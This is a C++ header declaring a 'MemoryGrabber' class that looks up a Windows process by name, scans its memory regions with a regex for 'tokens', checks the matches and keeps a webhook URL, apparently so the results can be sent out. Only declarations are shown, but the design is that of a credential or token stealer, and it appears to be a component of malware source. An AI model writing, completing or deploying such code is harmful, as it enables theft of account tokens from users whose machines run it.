#ifndef TOKENS_HPP
#define TOKENS_HPP

#include <iostream>

#include <regex>
#include <mutex>
#include <vector>

#include <Windows.h>
#include "webhooks.hpp"

class MemoryGrabber {
private:
	std::regex filter_regex;
	std::mutex match_mutex;

	static std::string convert_wide(std::wstring& wide_string);
	static bool		   check_token(std::string token);

public:
	std::vector<std::string> tokens;
	std::wstring		     process;

	DWORD	 process_id;
	int		 match_count;
	Webhook* webhook;

	MemoryGrabber(std::wstring& process, std::string webhook_url);

	void process_memory_region(HANDLE process, BYTE* addr, size_t region_size);

	MemoryGrabber* get_process_by_name();
	MemoryGrabber* scan_process();
};


#endif TOKENS_HPP